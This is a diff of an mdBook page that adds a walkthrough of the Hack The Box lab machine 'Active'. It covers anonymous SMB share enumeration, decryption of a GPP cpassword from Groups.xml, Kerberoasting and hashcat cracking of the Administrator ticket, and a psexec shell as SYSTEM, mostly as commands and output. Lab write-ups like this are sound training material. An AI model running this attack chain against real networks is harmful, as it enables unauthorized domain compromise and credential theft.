@@ -3,7 +3,7 @@
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
-        <title>Lock - Walkthroughs</title>
+        <title>Active - Walkthroughs</title>
 
 
         <!-- Custom HTML head -->
@@ -175,7 +175,149 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="chapter-1"><a class="header" href="#chapter-1">Chapter 1</a></h1>
+                        <h1 id="active"><a class="header" href="#active">Active</a></h1>
+<h1 id="initial-foothold"><a class="header" href="#initial-foothold">Initial Foothold</a></h1>
+<h2 id="enumerating-shares"><a class="header" href="#enumerating-shares">Enumerating Shares</a></h2>
+<p>SMB Null Auth was enabled on the machine, so we will start with enumerating the available shares and see what shares can we read</p>
+<pre><code class="language-bash">└─$ netexec smb $(cat ip) -u "" -p "" --shares                                             
+SMB         10.129.100.141  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
+SMB         10.129.100.141  445    DC               [+] active.htb\: 
+SMB         10.129.100.141  445    DC               [*] Enumerated shares
+SMB         10.129.100.141  445    DC               Share           Permissions     Remark
+SMB         10.129.100.141  445    DC               -----           -----------     ------
+SMB         10.129.100.141  445    DC               ADMIN$                          Remote Admin
+SMB         10.129.100.141  445    DC               C$                              Default share
+SMB         10.129.100.141  445    DC               IPC$                            Remote IPC
+SMB         10.129.100.141  445    DC               NETLOGON                        Logon server share 
+SMB         10.129.100.141  445    DC               Replication     READ            
+SMB         10.129.100.141  445    DC               SYSVOL                          Logon server share 
+SMB         10.129.100.141  445    DC               Users
+</code></pre>
+<p>We found a share called <code>Replication</code>, which we have <code>READ</code> permission over.</p>
+<h2 id="enumerating-the-share"><a class="header" href="#enumerating-the-share">Enumerating the share</a></h2>
+<p>NetExec has a module called <code>spider_plus</code> which will go over the share and enumerate all the files that our user can read, and list these files in JSON format.</p>
+<p>Here, we specify the <code>-M</code> for telling NetExec that we want to use the <code>spider_plus</code> module, and that we want to run it on the <code>Replication</code> share.</p>
+<pre><code class="language-bash">└─$ netexec smb $(cat ip) -u "" -p "" -M spider_plus --share Replication
+SMB         10.129.100.141  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
+SMB         10.129.100.141  445    DC               [+] active.htb\: 
+SPIDER_PLUS 10.129.100.141  445    DC               [*] Started module spidering_plus with the following options:
+SPIDER_PLUS 10.129.100.141  445    DC               [*]  DOWNLOAD_FLAG: False
+SPIDER_PLUS 10.129.100.141  445    DC               [*]     STATS_FLAG: True
+SPIDER_PLUS 10.129.100.141  445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
+SPIDER_PLUS 10.129.100.141  445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
+SPIDER_PLUS 10.129.100.141  445    DC               [*]  MAX_FILE_SIZE: 50 KB
+SPIDER_PLUS 10.129.100.141  445    DC               [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
+SMB         10.129.100.141  445    DC               [*] Enumerated shares
+SMB         10.129.100.141  445    DC               Share           Permissions     Remark
+SMB         10.129.100.141  445    DC               -----           -----------     ------
+SMB         10.129.100.141  445    DC               ADMIN$                          Remote Admin
+SMB         10.129.100.141  445    DC               C$                              Default share
+SMB         10.129.100.141  445    DC               IPC$                            Remote IPC
+SMB         10.129.100.141  445    DC               NETLOGON                        Logon server share 
+SMB         10.129.100.141  445    DC               Replication     READ            
+SMB         10.129.100.141  445    DC               SYSVOL                          Logon server share 
+SMB         10.129.100.141  445    DC               Users                           
+SPIDER_PLUS 10.129.100.141  445    DC               [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.100.141.json".
+SPIDER_PLUS 10.129.100.141  445    DC               [*] SMB Shares:           7 (ADMIN$, C$, IPC$, NETLOGON, Replication, SYSVOL, Users)
+SPIDER_PLUS 10.129.100.141  445    DC               [*] SMB Readable Shares:  1 (Replication)
+SPIDER_PLUS 10.129.100.141  445    DC               [*] Total folders found:  22
+SPIDER_PLUS 10.129.100.141  445    DC               [*] Total files found:    7
+SPIDER_PLUS 10.129.100.141  445    DC               [*] File size average:    1.16 KB
+SPIDER_PLUS 10.129.100.141  445    DC               [*] File size min:        22 B
+SPIDER_PLUS 10.129.100.141  445    DC               [*] File size max:        3.63 KB
+</code></pre>
+<p>As we see from this line</p>
+<pre><code class="language-bash">Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.100.141.json".
+</code></pre>
+<p>the files was saved under <code>/home/kali/.nxc/modules/nxc_spider_plus/10.129.100.141.json</code>.</p>
+<p>Upon reading that file, we notice that the share has a very interesting file called <code>Groups.xml</code>.</p>
+<pre><code class="language-bash">&lt;SNIP&gt;
+"active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml": {
+            "atime_epoch": "2018-07-21 06:37:44",
+            "ctime_epoch": "2018-07-21 06:37:44",
+            "mtime_epoch": "2018-07-21 06:38:11",
+            "size": "533 B"
+        }
+&lt;SNIP&gt;
+</code></pre>
+<p>This file means that Group Policy Preferences (GPP) is configured.</p>
+<h3 id="what-is-group-policy-preferences-gpp"><a class="header" href="#what-is-group-policy-preferences-gpp">What is Group Policy Preferences (GPP)?</a></h3>
+<p>GPP was introduced with the release of Server 2008 and enhance Group Policy by allowing administrators to configure additional settings beyond standard policy options.
+When an admin used <strong>Group Policy Preferences (GPP)</strong> to set a local user or group password, the password was stored in <strong>Groups.xml inside a tag called <code>cpassword</code>.</strong></p>
+<p>The <code>cpassword</code> is encrypted, but Microsoft shared the AES key used to encrypt the password in their <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">documentation</a>. Which means anyone can decrypt the password.</p>
+<h3 id="downloading-the-file--decrypting-the-password"><a class="header" href="#downloading-the-file--decrypting-the-password">Downloading the file &amp; Decrypting the password</a></h3>
+<pre><code class="language-bash">└─$ smbclient -N //$(cat ip)/Replication
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \&gt; cd active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/
+smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\&gt; get Groups.xml
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
+</code></pre>
+<p>Upon reading the file, we can see the <code>cpassword</code> for <code>svc_tgs</code> user.</p>
+<pre><code class="language-xml">&lt;SNIP&gt;
+name="active.htb\SVC_TGS" i
+&lt;SNIP&gt;
+cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
+&lt;SNIP&gt;
+</code></pre>
+<p>Decrypting the password using <code>gpp-decrypt</code>, not we have a set of credentials <code>svc_tgs:GP&lt;REDACTED&gt;18</code>.</p>
+<pre><code class="language-bash">└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+GP&lt;REDACTED&gt;18
+</code></pre>
+<h1 id="privilege-escalation"><a class="header" href="#privilege-escalation">Privilege Escalation</a></h1>
+<h2 id="gathering-bloodhound-data"><a class="header" href="#gathering-bloodhound-data">Gathering BloodHound Data</a></h2>
+<p>Using the foothold to enumerate AD using bloodhound.</p>
+<pre><code class="language-bash">└─$ sudo bloodhound-python -u 'svc_tgs' -p 'GP&lt;REDACTED&gt;18' -ns $(cat ip) -d active.htb -c all
+</code></pre>
+<p>After uploading data to bloodhound, we found that the administrator account is kerberoastable</p>
+<p><img src="image.png" alt="image.png" /></p>
+<h2 id="kerberoasting-administrator-using-getuserspns"><a class="header" href="#kerberoasting-administrator-using-getuserspns">Kerberoasting <code>Administrator</code> using <code>GetUserSPNs</code></a></h2>
+<pre><code class="language-bash">└─$ impacket-GetUserSPNs -dc-ip $(cat ip) active.htb/svc_tgs -request-user administrator -outputfile administrator_tgs
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-09-01 13:47:21.242545             
+
+[-] CCache file is not found. Skipping...
+</code></pre>
+<h2 id="cracking-the-hash-using-hashcat"><a class="header" href="#cracking-the-hash-using-hashcat">Cracking the Hash using Hashcat</a></h2>
+<pre><code class="language-bash">└─$ hashcat -a 0 -m 13100 administrator_tgs /usr/share/wordlists/rockyou.txt
+
+&lt;SNIP&gt;
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$418a029631bc4e0678d33eb17599dfd4$541e6e679f8755852260c872d46a038f5ef75a3641852d5f96612d4a56e23940d9421a1
+8865a936efb4dc751c456e15b1257ce2dffda1c5f1a52c9afda31336d57bbd5df836b9831b96ea8006f0ec0660d4f08991d1b600bac8ac30ef05aa2f48889c284cc61f6654535433661e7a0867b2ca6fbe88d980
+8c4d0cf492ec51b9ec9a64dfffd9b3ee4911307e9772a40dbb0471a004eae956cd448f67fde24534ccc5cd8689d91921598736459c22bd9ea4b358c43d22e1deda4dc76ab8ca0c180a7b159f3c1a1e5ef4ab0491
+d601a2436600134b72d6c5a44d00e5197972ce69cfcb89c36a2ce0ee2418eeb12247c3d88cc0d9faea1224e9c4933d9769d9220a4d0bdf708dd00e8d08993a255a64a3f5f005f2f9c65a1d25613cf81e14519fa1
+f8cca36d1e5cf750bb20dcb7eda1ad48bafd9ef4eedc8e41756bf744bfd27b5716938009725713ac47dd89d15d40266f8c5a033b95288f2f47e067d4bb702db6995ec04a6a3c15edec05e2253b06817991181841
+8741db2092bceb0bd47e54dc517d8313c5a7e407c4e7abe8f1ab3978d4812ae1d0b11ad860ccd54236942178bd4db10d784326d5e7f99420f52b86ebfe2ce45f3720443bcfb65f8b321011f6f06cafa3bda33cb3
+2d1c37fba764832997c37ff278d5f4065a3a16f19069e5be0d15905df7b5093a901c1418f18ab02a3e69604e3b307b4d716b51f8a85965c83846180879d9c32013e2432ad2c14c664f9256af24d857f2a5afae84
+2745c37dcf9c27c6f36bf6c7fc47527f304a1ed431823f95ecd7a01f4262e6d59be40f65dee72575c7f70d5e2c5ec83373b82df74a9035fd57aee34135d782bb918707df2d4a5f35e21bbd239803c29081569585
+13d4e791c4dbebcdd8d17cdded734243db14fdb4ebe12cf56533aac2ac12fa5974a59a634bea71fcd46d36af5cd17e44d72a63eb1f9b3f6e90d7ef05964cb9ac5acfe9187a83667b4e82795d29ab2980f1a24955
+8b8a364cdd28771d0198c1b0b7479d6c5368907507a4329d9520b303ca0e95b10b34f52ee0e0e1b56a2899a29a56754ba9f168be202bdd223d247e3aeb8cd1357cc2fa67fef23c7cd6e3f05081110d11f1960e9d
+235c72e39a877514d89ddce536458aa5923428fe73a20799c686a8440cfc3753c2c1c4e0be1179cf7fce9370035347d0b512f5bcd9bdd5625574587fd3420093dcf7f337eeae24968f64434c149d1f0f70e59ba0
+16831802671439375254a09471bbb:Ti&lt;REDACTED&gt;68
+&lt;SNIP&gt;
+</code></pre>
+<p>We got the password <code>Ti&lt;REDACTED&gt;68</code></p>
+<h1 id="gaining-access"><a class="header" href="#gaining-access">Gaining Access</a></h1>
+<pre><code class="language-bash">└─$ impacket-psexec active.htb/administrator:'Ti&lt;REDACTED&gt;68'@$(cat ip)  
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.129.100.141.....
+[*] Found writable share ADMIN$
+[*] Uploading file CZBuECdy.exe
+[*] Opening SVCManager on 10.129.100.141.....
+[*] Creating service LNnx on 10.129.100.141.....
+[*] Starting service LNnx.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+</code></pre>
 
                     </main>
 
